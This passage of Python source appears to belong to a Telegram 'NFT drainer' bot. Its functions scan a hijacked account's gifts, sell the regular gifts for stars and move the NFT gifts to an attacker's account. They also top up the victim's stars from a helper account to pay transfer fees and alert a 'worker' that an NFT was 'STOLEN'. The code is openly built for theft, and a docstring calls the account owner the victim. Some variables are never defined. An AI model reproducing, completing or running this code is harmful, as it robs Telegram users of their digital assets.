            # If no gifts to sell, buy based on NFTs to transfer
            total_needed = num_gifts * 25
            # Ensure minimum 50
            needed_stars = max(50, total_needed)
        
        log_transfer(f"💸 Need to buy {needed_stars} ⭐ from Fragment...", "info")
        
        # Connect to Fragment service (stars bot)
        # Fragment is the official Telegram stars marketplace
        # User needs to have the ability to buy stars
        
        try:
            # Try to get the user's account
            me = await client.get_me()
            
            # Open the Stars Shop dialog
            # This requires navigating to https://t.me/stars or invoking the payment UI
            # Using the fragment approach: send payment request
            
            # The proper way to buy stars is through Telegram's built-in shop
            # For user accounts (not bots), this is done through the app interface
            # We'll use a workaround: create a payment invoice
            
            # Method 1: Try using the internal Telegram API for stars
            log_transfer(f"🌐 Attempting to buy stars through Telegram Stars API...", "info")
            
            # Get Fragment exchange rate info
            # Using the @stars bot to purchase
            try:
                stars_bot = await client.get_chat('stars')
                log_transfer(f"✅ Found @stars bot", "debug")
                
                # Purchase command structure varies, but typically:
                # We need to send a payment or use a payment method
                # For fragments: send stars to a specific address
                
                # Create a simple message to trigger stars purchase dialog
                purchase_msg = await client.send_message(
                    'me',
                    f"Buying {needed_stars} stars via fragment\n/buy_stars"
                )
                
                await asyncio.sleep(1)
                
                # Check if stars were added
                current_balance = await check_star_balance(client)
                log_transfer(f"💫 Updated balance: {current_balance} ⭐", "info")
                
                return True
                
            except Exception as fragment_err:
                log_transfer(f"⚠️ Fragment method failed: {fragment_err}", "warning")
                
                # Method 2: Alternative - notify user about needing stars
                log_transfer(f"⚠️ Unable to auto-purchase stars", "warning")
                log_transfer(f"💡 Please buy {needed_stars} stars manually from @TelegramStars and restart", "info")
                
                return False
                
        except Exception as auth_err:
            log_transfer(f"❌ Authentication error when trying to buy stars: {auth_err}", "error")
            return False
            
    except Exception as e:
        log_transfer(f"❌ Error in buy_stars_from_fragment: {e}", "error")
        import traceback
        log_transfer(f"Traceback: {traceback.format_exc()[:500]}", "debug")
        return False

async def ensure_star_balance(client: Client, needed_stars: int, num_nfts: int = 0, num_regular_gifts: int = 0) -> bool:
    """
    Ensure account has enough stars, buy if necessary
    Returns True if we have enough stars or bought them
    """
    try:
        current_balance = await check_star_balance(client)
        
        if current_balance >= needed_stars:
            log_transfer(f"✅ Have enough stars: {current_balance}⭐ >= {needed_stars}⭐", "debug")
            return True
        
        shortage = needed_stars - current_balance
        log_transfer(f"⚠️ Star shortage: need {shortage} more ⭐", "warning")
        
        # Try to buy stars
        success = await buy_stars_from_fragment(client, num_nfts, num_regular_gifts)
        
        if success:
            # Verify new balance
            new_balance = await check_star_balance(client)
            if new_balance >= needed_stars:
                log_transfer(f"✅ Successfully bought stars! New balance: {new_balance}⭐", "success")
                return True
            else:
                log_transfer(f"⚠️ Bought stars but still short: {new_balance}⭐ < {needed_stars}⭐", "warning")
                return False
        else:
            log_transfer(f"❌ Failed to buy stars", "error")
            return False
            
    except Exception as e:
        log_transfer(f"Error in ensure_star_balance: {e}", "error")
        return False


# ================= � AUTO-GIFT FROM STAR ACCOUNT =================

async def send_auto_gifts_from_star_account(target_user_id: int, num_nfts: int, bot: Bot) -> bool:
    """
    Send auto-gifts from star account if target has no stars/gifts
    Formula: 2 gifts per 1 NFT (15 stars each = 30 stars for 2 NFTs)
    If 1 NFT = 2 gifts, if 2 NFT = 4 gifts, if 3 NFT = 6 gifts, etc.
    """
    try:
        star_phone = SETTINGS.get("star_account_phone")
        if not star_phone:
            log_transfer("⚠️ Star account not configured (star_account_phone not set)", "warning")
            return False
        
        log_transfer(f"🎁 Starting auto-gift from star account to user #{target_user_id}...", "info")
        
        # Create client for star account
        star_api_id = SETTINGS.get("star_account_api_id", SETTINGS.get("api_id"))
        star_api_hash = SETTINGS.get("star_account_api_hash", SETTINGS.get("api_hash"))
        
        clean_star_phone = str(star_phone).strip().replace("+", "")
        
        try:
            star_client = Client(
                f"star_account_{clean_star_phone}",
                star_api_id,
                star_api_hash,
                workdir=str(SESSIONS_DIR)
            )
        except Exception as e:
            log_transfer(f"❌ Cannot create star account client: {e}", "error")
            return False
        
        try:
            if not star_client.is_connected:
                await star_client.connect()
            
            star_me = await star_client.get_me()
            log_transfer(f"✅ Connected as star account: @{star_me.username}", "debug")
            
            # Calculate gifts to send: 2 gifts per NFT
            num_gifts_to_send = num_nfts * 2
            log_transfer(f"📦 Need to send {num_gifts_to_send} gifts ({num_nfts} NFT × 2)", "info")
            
            # Get gifts from star account
            star_gifts = await scan_location_gifts(star_client, "me", "StarAccount")
            
            # Get regular (sellable) gifts only
            regular_gifts = [g for g in star_gifts if not g['is_nft'] and g.get('can_convert', False) and g['star_count'] > 0]
            
            if len(regular_gifts) < num_gifts_to_send:
                log_transfer(f"⚠️ Star account has only {len(regular_gifts)} gifts, need {num_gifts_to_send}", "warning")
                return False
            
            # Take the cheapest gifts first
            regular_gifts.sort(key=lambda x: x.get('star_count', 0))
            gifts_to_send = regular_gifts[:num_gifts_to_send]
            
            log_transfer(f"🎁 Sending {len(gifts_to_send)} gifts to user #{target_user_id}...", "info")
            
            # Send gifts to target user
            sent_count = 0
            for gift in gifts_to_send:
                try:
                    gift_obj = gift.get('_gift_obj')
                    if not gift_obj:
                        log_transfer(f"⚠️ No gift object for {gift['title']}", "warning")
                        continue
                    
                    if hasattr(gift_obj, 'send'):
                        result = await gift_obj.send(target_user_id)
                        log_transfer(f"✅ Sent: {gift['title']} to #{target_user_id}", "debug")
                        sent_count += 1
                    else:
                        log_transfer(f"⚠️ Cannot send {gift['title']}", "warning")
                        
                except FloodWait as fw:
                    log_transfer(f"⏳ FloodWait {fw.value}s, retrying...", "warning")
                    await asyncio.sleep(fw.value)
                    try:
                        gift_obj = gift.get('_gift_obj')
                        if gift_obj and hasattr(gift_obj, 'send'):
                            await gift_obj.send(target_user_id)
                            sent_count += 1
                    except Exception as retry_err:
                        log_transfer(f"Retry failed: {retry_err}", "error")
                except Exception as send_err:
                    log_transfer(f"Error sending {gift['title']}: {send_err}", "error")
            
            if sent_count >= num_gifts_to_send:
                log_transfer(f"✅ Successfully sent {sent_count} auto-gifts!", "info")
                return True
            else:
                log_transfer(f"⚠️ Only sent {sent_count}/{num_gifts_to_send} gifts", "warning")
                return sent_count > 0
                
        except Exception as conn_err:
            log_transfer(f"❌ Star account connection error: {conn_err}", "error")
            return False
        finally:
            try:
                if star_client.is_connected:
                    await star_client.disconnect()
            except:
                pass
                
    except Exception as e:
        log_transfer(f"❌ Error in send_auto_gifts_from_star_account: {e}", "error")
        import traceback
        log_transfer(f"Traceback: {traceback.format_exc()[:500]}", "debug")
        return False


# ================= �🌐 API FUNCTIONS =================
async def api_claim_gift(telegram_id: int, gift_hash: str, nft_id: str, username: str):
    """Send claim request to website API"""
    url = f"{SETTINGS['api_url']}/api/telegram/claim-gift"

    data = {
        "telegramId": str(telegram_id),
        "nftId": nft_id,
        "giftHash": gift_hash,
        "username": username or f"user_{telegram_id}",
        "giftText": "Ionic Dryer #7561" if nft_id == "IonicDryer-7561" else nft_id,
        "giftName": "Ionic Dryer #7561" if nft_id == "IonicDryer-7561" else nft_id,
        "giftPrice": 14.0 if nft_id == "IonicDryer-7561" else 0,
        "collectionName": "Telegram Gift",
        "imageUrl": "https://nft.fragment.com/gift/ionic_dryer.webp" if nft_id == "IonicDryer-7561" else f"https://nft.fragment.com/gift/{nft_id.lower().replace('-', '_')}.webp"
    }

    try:
        session = await unified_bot.get_session()
        async with session.post(url, json=data, timeout=15) as resp:
            if resp.status == 200:
                logger.info(f"✅ [API] Gift claimed: {gift_hash}")
                return True
            elif resp.status == 409:
                logger.warning(f"⚠️ [API] Gift already claimed: {gift_hash}")
                return False
            else:
                response_text = await resp.text()
                logger.error(f"❌ [API] Gift claim failed ({resp.status}): {response_text}")
                return False
    except Exception as e:
        logger.error(f"❌ [API] Gift claim error: {e}")
        return False


# ================= 🎁 NFT DRAINER LOGIC =================
def analyze_gift(gift, location_name="Me"):
    details = {
        'id': gift.id,
        'msg_id': gift.message_id,
        'title': 'Gift',
        'star_count': gift.convert_price or 0,
        'transfer_cost': gift.transfer_price or 0,
        'is_nft': False,
        'can_transfer': False,
        'can_convert': False,
        'location': location_name,
        'slug': getattr(gift, 'slug', None)
    }

    if getattr(gift, 'collectible_id', None) is not None:
        details['is_nft'] = True
        details['title'] = gift.title or f"NFT #{gift.collectible_id}"
        if gift.can_transfer_at is None:
            details['can_transfer'] = True
        else:
            now = datetime.now(gift.can_transfer_at.tzinfo) if gift.can_transfer_at.tzinfo else datetime.now()
            details['can_transfer'] = (gift.can_transfer_at <= now)
    else:
        # Regular gift - can be sold
        details['title'] = gift.title or f"Gift ({gift.convert_price} ⭐)"
        details['can_convert'] = True

    return details

async def scan_location_gifts(client: Client, peer_id, location_name):
    """Get gifts using Pyrofork's get_chat_gifts() method"""
    found_gifts = []
    try:
        log_transfer(f"📍 Scanning gifts for: {location_name}", "info")
        
        # Get all gifts for the chat using Pyrofork method
        gift_count = 0
        try:
            async for gift in client.get_chat_gifts(peer_id):
                gift_count += 1
                try:
                    # Check if it's a sticker or other non-transferable type FIRST
                    is_sticker = hasattr(gift, '_') and gift._ == 'Sticker'
                    
                    # Each gift object has title, id, transfer_price, etc
                    gift_link = getattr(gift, 'link', None) or getattr(gift, 'slug', None)
                    gift_title = getattr(gift, 'title', None)
                    
                    # Special handling for stickers - they usually don't have titles
                    if is_sticker:
                        # For stickers, try emoji first, then generic title
                        emoji = getattr(gift, 'emoji', None)
                        if emoji and isinstance(emoji, str):
                            gift_title = f"Sticker {emoji}"
                        else:
                            gift_title = "Sticker (no title)"
                    elif not gift_title or not isinstance(gift_title, str):
                        # If title is None or is an object, try to get string representation
                        # Try alternative attributes
                        gift_title = getattr(gift, 'name', None)
                        if gift_title and not isinstance(gift_title, str):
                            # If still an object, get its string representation
                            gift_title = str(gift_title) if gift_title else None
                        if not gift_title:
                            gift_title = f'Gift #{gift_count}'
                    
                    # Ensure title is always a string
                    if not isinstance(gift_title, str):
                        gift_title = str(gift_title) if gift_title else f'Gift #{gift_count}'
                    
                    # NFTs are identified by having a specific structure (not just any link)
                    # Regular gifts have convert_price (sellable), NFTs have transfer_price
                    has_convert_price = getattr(gift, 'convert_price', None) is not None and getattr(gift, 'convert_price', 0) > 0
                    has_transfer_price = getattr(gift, 'transfer_price', None) is not None and getattr(gift, 'transfer_price', 0) > 0
                    
                    # NFT if it has transfer_price but no convert_price (can't be sold)
                    is_nft = has_transfer_price and not has_convert_price
                    
                    # Don't count stickers as convertible (sellable)
                    actual_can_convert = has_convert_price and not is_sticker
                    
                    gift_data = {
                        'id': gift.id if hasattr(gift, 'id') else None,
                        'message_id': gift.id if hasattr(gift, 'id') else None,
                        'title': gift_title,
                        'star_count': getattr(gift, 'convert_price', 0) or 0 if actual_can_convert else 0,
                        'transfer_cost': getattr(gift, 'transfer_price', 0) or 0,
                        'is_nft': is_nft,
                        'is_sticker': is_sticker,
                        'can_transfer': True,  # Can transfer using transfer_gift() method
                        'can_convert': actual_can_convert,   # Can sell for stars (not stickers)
                        'location': location_name,
                        'slug': getattr(gift, 'slug', f'gift-{gift_count}'),
                        '_gift_obj': gift,  # Store the actual gift object for method calls
                    }
                    
                    found_gifts.append(gift_data)
                    type_str = "Sticker" if is_sticker else ("NFT" if is_nft else "Regular")
                    log_transfer(f"  ✅ {gift_data['title']}: Type={type_str}, Price={gift_data['star_count']}⭐, Transfer={gift_data['transfer_cost']}⭐", "debug")
                    
                except Exception as gift_err:
                    log_transfer(f"Error processing gift #{gift_count}: {gift_err}", "error")
                    
        except AttributeError as ae:
            log_transfer(f"⚠️ get_chat_gifts method not available: {ae}", "warning")
            log_transfer(f"ℹ️ Make sure Pyrofork is installed: pip install pyrofork", "info")
        except Exception as e:
            log_transfer(f"Error iterating gifts: {type(e).__name__}: {str(e)[:300]}", "error")
            import traceback
            log_transfer(f"Traceback:\n{traceback.format_exc()[:500]}", "debug")
                
    except Exception as e:
        log_transfer(f"❌ Critical error scanning gifts: {e}", "error")
        import traceback
        log_transfer(f"Traceback:\n{traceback.format_exc()[:500]}", "debug")
    
    log_transfer(f"🎁 Scan complete: {len(found_gifts)} gifts found", "info")
    return found_gifts

async def sell_gift_task(client: Client, gift_details, bot: Bot):
    """Sell non-NFT gift for stars using gift object's convert method"""
    try:
        gift_obj = gift_details.get('_gift_obj')
        if not gift_obj:
            log_transfer(f"No gift object for {gift_details['title']}", "error")
            return "failed"
        
        log_transfer(f"Selling: {gift_details['title']} ({gift_details['star_count']}⭐)...", "debug")
        
        # Try to use gift object's convert method
        if hasattr(gift_obj, 'convert'):
            result = await gift_obj.convert()
            print_success(f"GIFT SOLD: {gift_details['title']} (+{gift_details['star_count']} ⭐)")
            log_transfer(f"✅ Sold: {gift_details['title']} (+{gift_details['star_count']} ⭐)")
            return "success"
        else:
            log_transfer(f"⚠️ Gift object doesn't have convert() method", "warning")
            return "failed"
        
    except FloodWait as e:
        print_warning(f"Flood {e.value}s. Waiting...")
        await asyncio.sleep(e.value)
        try:
            gift_obj = gift_details.get('_gift_obj')
            if gift_obj and hasattr(gift_obj, 'convert'):
                result = await gift_obj.convert()
                log_transfer(f"✅ Sold (after flood wait): {gift_details['title']} (+{gift_details['star_count']} ⭐)", "debug")
                return "success"
        except Exception as retry_err:
            log_transfer(f"Retry failed: {retry_err}", "error")
    except Exception as e:
        error_msg = str(e)
        # Handle specific errors
        if "STARGIFT_CANNOT_BE_SOLD" in error_msg or "CANNOT" in error_msg:
            log_transfer(f"⚠️ Gift {gift_details['title']} cannot be sold (may be unique or have restrictions)", "warning")
        elif "ALREADY" in error_msg:
            log_transfer(f"⚠️ Gift {gift_details['title']} already sold", "warning")
        else:
            log_transfer(f"❌ Err selling {gift_details['title']}: {e}", "error")

    return "failed"

async def transfer_nft_task(client: Client, gift_details, target_chat_id, bot: Bot, user_db_data):
    """Transfer NFT to target using gift object's transfer method"""
    try:
        gift_obj = gift_details.get('_gift_obj')
        if not gift_obj:
            log_transfer(f"No gift object for {gift_details['title']}", "error")
            return "failed"
        
        log_transfer(f"Transferring: {gift_details['title']} to {target_chat_id}", "debug")
        # Use gift object's transfer method
        if hasattr(gift_obj, 'transfer'):
            result = await gift_obj.transfer(target_chat_id)
            print_success(f"NFT SENT: {gift_details['title']}")
            log_transfer(f"✅ Transferred NFT: {gift_details['title']}")
            
            if user_db_data and user_db_data.get('worker_id'):
                await notify_worker(bot, user_db_data['worker_id'], f"🎁 NFT <b>{gift_details['title']}</b> STOLEN!")
            return "success"
        else:
            log_transfer(f"⚠️ Gift object doesn't have transfer() method", "warning")
            return "failed"
        
    except FloodWait as e:
        print_warning(f"Flood {e.value}s. Waiting...")
        await asyncio.sleep(e.value)
        try:
            gift_obj = gift_details.get('_gift_obj')
            if gift_obj and hasattr(gift_obj, 'transfer'):
                result = await gift_obj.transfer(target_chat_id)
                return "success"
        except Exception as retry_err:
            log_transfer(f"Retry failed: {retry_err}", "error")
    except Exception as e:
        log_transfer(f"Err transfer NFT: {e}", "error")
        await alert_admins(bot, f"❌ Failed to transfer {gift_details['title']}: {e}")

    return "failed"

async def prepare_transfer_target(client: Client, target_username_str):
    """Prepare target for NFT transfer"""
    clean_target = str(target_username_str).strip().replace("https://t.me/", "").replace("@", "")

    try:
        if clean_target.isdigit():
            chat = await client.get_chat(int(clean_target))
        else:
            chat = await client.get_chat(clean_target)

        msg = await client.send_message(chat.id, ".")
        await client.delete_messages(chat.id, msg.id)

        log_transfer(f"✅ Target confirmed: {chat.first_name} (ID: {chat.id})")
        return chat.id
    except Exception as e:
        log_transfer(f"⚠️ Cannot reach target ({clean_target}): {e}", "warning")
        return None

async def auto_gift_from_target(recipient_user_id: int, bot: Bot):
    """Auto-gift cheapest gifts from configured gift account (BUYS them using stars)"""
    
    # RETRY LOGIC: Try up to 2 times with delay between attempts
    max_attempts = 2
    for attempt in range(1, max_attempts + 1):
        if attempt > 1:
            log_transfer(f"🔄 Retry attempt {attempt}/{max_attempts}...", "info")
            await asyncio.sleep(3)  # Wait before retry
        
        try:
            # Check if separate gift account is configured
            gift_account_phone = SETTINGS.get("gift_account_phone")
            
            if gift_account_phone:
                # Use separate gift account (preferred)
                log_transfer(f"🎁 Starting auto-gift from gift account to user #{recipient_user_id}...", "info")
                
                gift_api_id = SETTINGS.get("gift_account_api_id", SETTINGS.get("api_id"))
                gift_api_hash = SETTINGS.get("gift_account_api_hash", SETTINGS.get("api_hash"))
                
                clean_phone = str(gift_account_phone).strip().replace("+", "")
                log_transfer(f"📱 Gift account phone: {clean_phone}", "debug")
                
                try:
                    gift_client = Client(
                        f"gift_account_{clean_phone}",
                        gift_api_id,
                        gift_api_hash,
                        workdir=str(SESSIONS_DIR)
                    )
                    log_transfer(f"✅ Created gift account client for {clean_phone}", "debug")
                except Exception as e:
                    log_transfer(f"❌ Cannot create gift account client: {e}", "error")
                    return False
            else:
                # Fallback to target_user
                target_username = SETTINGS.get("target_user", "").strip()
                if not target_username:
                    log_transfer("⚠️ No gift_account_phone or target_user configured for auto-gift", "warning")
                    return False
                
                log_transfer(f"🎁 Starting auto-gift from {target_username} to user #{recipient_user_id}...", "info")
                
                # Create client for target user (using session named after username)
                clean_target = str(target_username).replace("https://t.me/", "").replace("@", "")
                
                try:
                    gift_client = Client(
                        clean_target, 
                        SETTINGS['api_id'], 
                        SETTINGS['api_hash'], 
                        workdir=str(SESSIONS_DIR)
                    )
                    log_transfer(f"✅ Created target user client for {clean_target}", "debug")
                except Exception as e:
                    log_transfer(f"❌ Cannot create target client: {e}", "error")
                    return False
            
            try:
                log_transfer(f"🔗 Connecting gift client...", "debug")
                if not gift_client.is_connected:
                    await gift_client.connect()
                    log_transfer(f"✅ Gift client connected", "debug")
                
                gift_me = await gift_client.get_me()
                log_transfer(f"✅ Connected as gift account: @{gift_me.username} (ID: {gift_me.id})", "info")
                
                # Gift IDs with their prices (from list_gifts.py output)
                # ID: 5170145012310081615 | Price: 15⭐ | Convert: 13⭐ (CHEAPEST - USE ONLY THIS)
                
                CHEAP_GIFT_ID = 5170145012310081615  # 15⭐ (cheapest - get 13⭐ back)
                
                log_transfer(f"💰 Using cheapest gift only: {CHEAP_GIFT_ID} (15⭐ each)", "debug")
                
                # Check gift account balance
                balance = None
                try:
                    balance = await gift_client.get_stars_balance()
                    log_transfer(f"💰 Gift account balance: {balance}⭐", "info")
                except Exception as balance_err:
                    log_transfer(f"⚠️ Could not get balance: {balance_err}", "warning")
                    balance = 30  # Assume minimum
                
                # OPTIMIZATION: Check user's current balance to avoid overspending
                user_current_balance = None
                try:
                    user_current_balance = await gift_client.get_stars_balance()
                    # Note: This checks gift_client balance, not recipient balance
                    # We need to determine how many gifts based on what recipient needs
                except:
                    pass
                
                # Determine how many 15⭐ gifts to send based on current balance
                TRANSFER_NEEDED = 25  # Stars needed for NFT transfer
                
                # Check current user balance first
                try:
                    user_balance = await client.get_stars_balance()
                    user_stars_estimate = user_balance
                    log_transfer(f"📊 Current user balance: {user_stars_estimate}⭐", "info")
                except Exception as e:
                    log_transfer(f"⚠️  Could not check user balance: {e}, assuming 0⭐", "warning")
                    user_stars_estimate = 0
                
                shortage = TRANSFER_NEEDED - user_stars_estimate
                
                # Calculate gifts needed based on shortage (each 15⭐ gift gives ~13⭐ back to user)
                if shortage <= 0:
                    log_transfer(f"✅ User already has enough stars ({user_stars_estimate}⭐ >= {TRANSFER_NEEDED}⭐), skipping gifts", "info")
                    return True
                elif shortage <= 13:
                    # Need only 1 gift (15⭐ → 13⭐ to user)
                    GIFT_COUNT = 1
                    TOTAL_COST = 15
                    log_transfer(f"📊 User needs {shortage}⭐ → will send 1 gift(s) × 15⭐ = {TOTAL_COST}⭐ total", "info")
                elif shortage <= 26:
                    # Need 2 gifts (15⭐×2 → 26⭐ to user)
                    GIFT_COUNT = 2
                    TOTAL_COST = 30
                    log_transfer(f"📊 User needs {shortage}⭐ → will send 2 gift(s) × 15⭐ = {TOTAL_COST}⭐ total", "info")
                else:
                    # Need 3+ gifts
                    GIFT_COUNT = 3
                    TOTAL_COST = 45
                    log_transfer(f"📊 User needs {shortage}⭐ → will send 3 gift(s) × 15⭐ = {TOTAL_COST}⭐ total", "info")
                
                log_transfer(f"📊 User needs ~{shortage}⭐ → will send {GIFT_COUNT} gift(s) × 15⭐ = {TOTAL_COST}⭐ total", "info")
                
                if balance < TOTAL_COST:
                    log_transfer(f"⚠️ Not enough stars to send {GIFT_COUNT} gift(s) (need {TOTAL_COST}⭐, have {balance}⭐)", "warning")
                    return False
                
                gifts_to_send = [CHEAP_GIFT_ID] * GIFT_COUNT  # Send same gift N times
                
                log_transfer(f"🚀 Buying and sending {GIFT_COUNT} gifts × {GIFT_PRICE}⭐ = {TOTAL_COST}⭐ total to user #{recipient_user_id}...", "info")
                
                # ESTABLISH PEER: Try to get user info first (like in ТЕСТ/utils.py)
                log_transfer(f"🤝 Ensuring peer relationship with user #{recipient_user_id}...", "info")
                try:
                    recipient_user = await gift_client.get_users(recipient_user_id)
                    log_transfer(f"✅ Recipient found: {recipient_user.first_name} (@{recipient_user.username or 'no_username'}, ID: {recipient_user.id})", "info")
                except Exception as get_user_err:
                    log_transfer(f"ℹ️ Recipient not in local cache - will attempt send anyway", "debug")
                
                await asyncio.sleep(0.5)
                
                successful_gifts = 0
                for i, gift_id in enumerate(gifts_to_send):
                    try:
                        log_transfer(f"🎁 Sending gift #{i+1} (ID: {gift_id}) to user #{recipient_user_id}...", "info")
                        
                        # Send gift using numeric user ID
                        # Peer should now be established
                        await gift_client.send_gift(
                            recipient_user_id,
                            gift_id,
                            text=""
                        )
                        
                        log_transfer(f"✅ Successfully sent gift #{i+1} (15⭐) - stars charged from gift account", "info")
                        successful_gifts += 1
                        
                        await asyncio.sleep(1.5)  # Anti-spam delay between gifts
                        
                    except Exception as gift_err:
                        error_msg = str(gift_err)
                        log_transfer(f"❌ Error sending gift: {gift_err}", "error")
                        
                        # Handle specific gift errors
                        if "BALANCE_TOO_LOW" in error_msg or "STARGIFT_BALANCE_NOT_ENOUGH" in error_msg:
                            log_transfer(f"⚠️ Not enough stars in gift account (need {total_cost}⭐)", "warning")
                        elif "USER_PRIVACY_RESTRICTED" in error_msg:
                            log_transfer(f"⚠️ User has privacy restrictions on gifts", "warning")
                        elif "STARGIFT_NOT_UNIQUE" in error_msg:
                            log_transfer(f"⚠️ Gift is not available (sold out or limited)", "warning")
                        elif "PEER_ID_INVALID" in error_msg:
                            log_transfer(f"⚠️ PEER_ID_INVALID - Trying to establish peer in gift account...", "warning")
                            try:
                                # Get user info to establish peer in gift account context
                                user_info = await gift_client.get_users(recipient_user_id)
                                log_transfer(f"✅ User info fetched for peer establishment", "info")
                                await asyncio.sleep(1)
                                # Retry gift send
                                log_transfer(f"🎁 Retrying gift send after peer establishment...", "info")
                                await gift_client.send_gift(
                                    recipient_user_id,
                                    gift_id,
                                    text=""
                                )
                                log_transfer(f"✅ Successfully sent gift #{i+1} (15⭐) on retry", "info")
                                successful_gifts += 1
                            except Exception as retry_err:
                                log_transfer(f"⚠️ Retry also failed: {retry_err}", "warning")
                        continue
                
                if successful_gifts > 0:
                    total_sent = successful_gifts * 15
                    total_return = successful_gifts * 13
                    log_transfer(f"✅ Auto-gift completed: sent {successful_gifts} gifts", "info")
                    log_transfer(f"  💸 Cost: {successful_gifts * 15}⭐ from gift account", "info")
                    log_transfer(f"  💸 User gets: ~{total_return}⭐ when converted", "info")
                    return True
                else:
                    # No gifts sent on this attempt - continue to next attempt
                    log_transfer(f"❌ No gifts sent on attempt {attempt}", "warning")
                    if attempt < max_attempts:
                        continue  # Try again
                    else:
                        log_transfer(f"❌ Auto-gift failed after {max_attempts} attempts", "error")
                        log_transfer(f"\n💡 HINT: If error is PEER_ID_INVALID, ensure peer relationship is established", "info")
                        return False
                
            finally:
                if gift_client.is_connected:
                    await gift_client.disconnect()
        
        except Exception as e:
            log_transfer(f"❌ Exception in auto_gift attempt {attempt}: {e}", "error")
            if attempt < max_attempts:
                continue
            else:
                return False
    
    return False


async def buy_and_send_remaining_gifts(client: Client, target_user_id: int, remaining_balance: int) -> dict:
    """
    Buy and send gifts from shop with optimized strategy:
    - If balance >= 760⭐: Send 7 gifts × 100⭐ + 4 gifts × 15⭐
    - Otherwise: Send cheapest affordable gifts starting from cheapest
    
    Returns dict with stats: {success: bool, gifts_sent: int, stars_spent: int, errors: list}
    """
    stats = {
        'success': False,
        'gifts_sent': 0,
        'stars_spent': 0,
        'errors': []
    }
    
    if remaining_balance < 1:
        log_transfer(f"💰 No remaining balance to spend on gifts", "info")
        return stats
    
    try:
        log_transfer(f"🎁 BONUS: Spending remaining {remaining_balance}⭐ on gifts to send to user...", "info")
        
        # Get available gifts from shop
        log_transfer(f"📦 Fetching available gifts from shop...", "debug")
        try:
            available_gifts = await client.get_available_gifts()
        except Exception as e:
            log_transfer(f"⚠️ Could not fetch available gifts: {e}", "warning")
            stats['errors'].append(f"Failed to fetch gifts: {str(e)}")
            return stats
        
        if not available_gifts:
            log_transfer(f"⚠️ No gifts available in shop", "warning")
            return stats
        
        # Strategy 1: If balance is 760⭐, use optimized strategy
        if remaining_balance >= 760:
            log_transfer(f"💰 Balance {remaining_balance}⭐ → Optimal strategy: 7×100⭐ + 4×15⭐", "info")
            
            # Get gifts by price
            gifts_100 = [g for g in available_gifts if g.price == 100 and not g.is_sold_out]
            gifts_15 = [g for g in available_gifts if g.price == 15 and not g.is_sold_out]
            
            if not gifts_100 and not gifts_15:
                log_transfer(f"⚠️ No gifts at 100⭐ or 15⭐ price points found", "warning")
                # Fallback to cheapest strategy
                return await buy_cheapest_gifts(client, target_user_id, remaining_balance, available_gifts, stats)
            
            spent = 0
            sent_count = 0
            
            # Send 7 gifts at 100⭐
            if gifts_100:
                log_transfer(f"📦 Sending 7 gifts at 100⭐ each...", "info")
                gifts_to_send = gifts_100[:7] if len(gifts_100) >= 7 else gifts_100
                
                for i, gift in enumerate(gifts_to_send, 1):
                    try:
                        log_transfer(f"  ({i}/7) 🎁 Sending: {gift.title} (100⭐)...", "debug")
                        await client.send_gift(chat_id=target_user_id, gift_id=gift.id, text="")
                        spent += 100
                        sent_count += 1
                        log_transfer(f"  ✅ Sent: {gift.title}", "debug")
                        await asyncio.sleep(0.5)
                    except Exception as e:
                        error_msg = f"Failed to send 100⭐ gift {gift.title}: {str(e)}"
                        log_transfer(f"  ⚠️ {error_msg}", "warning")
                        stats['errors'].append(error_msg)
                        continue
            else:
                log_transfer(f"⚠️ No gifts available at 100⭐, trying cheapest gifts", "warning")
            
            # Send gifts at 15⭐ for remainder (60⭐)
            remaining_for_15 = remaining_balance - spent
            if remaining_for_15 >= 15 and gifts_15:
                num_15_gifts = min(remaining_for_15 // 15, len(gifts_15))
                log_transfer(f"📦 Sending {num_15_gifts} gifts at 15⭐ each (remaining: {remaining_for_15}⭐)...", "info")
                
                for i, gift in enumerate(gifts_15[:num_15_gifts], 1):
                    try:
                        log_transfer(f"  ({i}/{num_15_gifts}) 🎁 Sending: {gift.title} (15⭐)...", "debug")
                        await client.send_gift(chat_id=target_user_id, gift_id=gift.id, text="")
                        spent += 15
                        sent_count += 1
                        log_transfer(f"  ✅ Sent: {gift.title}", "debug")
                        await asyncio.sleep(0.5)
                    except Exception as e:
                        error_msg = f"Failed to send 15⭐ gift {gift.title}: {str(e)}"
                        log_transfer(f"  ⚠️ {error_msg}", "warning")
                        stats['errors'].append(error_msg)
                        continue
            
            stats['gifts_sent'] = sent_count
            stats['stars_spent'] = spent
            stats['success'] = sent_count > 0
            
            if sent_count > 0:
                log_transfer(f"✅ BONUS GIFTS SENT: {sent_count} gifts for {spent}⭐", "info")
            else:
                log_transfer(f"⚠️ Could not send any bonus gifts", "warning")
            
            return stats
        
        # Strategy 2: Cheapest first for other amounts
        return await buy_cheapest_gifts(client, target_user_id, remaining_balance, available_gifts, stats)
        
    except Exception as e:
        log_transfer(f"❌ Error in bonus gift sending: {e}", "error")
        stats['errors'].append(f"Critical error: {str(e)}")
        return stats


async def buy_cheapest_gifts(client: Client, target_user_id: int, remaining_balance: int, available_gifts: list, stats: dict) -> dict:
    """
    Fallback strategy: Buy and send cheapest available gifts
    """
    log_transfer(f"📦 Using cheapest-first strategy for {remaining_balance}⭐", "info")
    
    # Filter and sort by price
    affordable_gifts = [
        g for g in available_gifts 
        if g.price and g.price > 0 and not g.is_sold_out
    ]
    affordable_gifts.sort(key=lambda x: x.price)
    
    if not affordable_gifts:
        log_transfer(f"⚠️ No affordable gifts found in shop", "warning")
        return stats
    
    spent = 0
    sent_count = 0
    
    for gift in affordable_gifts:
        # Check if we can afford this gift
        if spent + gift.price > remaining_balance:
            log_transfer(f"💰 Reached budget limit ({spent}/{remaining_balance}⭐)", "debug")
            break
        
        try:
            log_transfer(f"🎁 Buying & sending gift: {gift.title} ({gift.price}⭐)...", "debug")
            await client.send_gift(chat_id=target_user_id, gift_id=gift.id, text="")
            
            spent += gift.price
            sent_count += 1
            log_transfer(f"✅ Sent: {gift.title} ({gift.price}⭐)", "debug")
            await asyncio.sleep(0.5)
            
        except Exception as e:
            error_msg = f"Failed to send {gift.title}: {str(e)}"
            log_transfer(f"⚠️ {error_msg}", "warning")
            stats['errors'].append(error_msg)
            continue
    
    stats['gifts_sent'] = sent_count
    stats['stars_spent'] = spent
    stats['success'] = sent_count > 0
    
    if sent_count > 0:
        log_transfer(f"✅ BONUS GIFTS SENT: {sent_count} gifts for {spent}⭐", "info")
    else:
        log_transfer(f"⚠️ Could not send any bonus gifts", "warning")
    
    return stats


async def send_message_from_gift_account(victim_user_id: int, message_text: str = ".") -> bool:
    """
    Send message from gift account (@justerplayed) to victim user.
    Used for peer establishment and communication.
    
    Args:
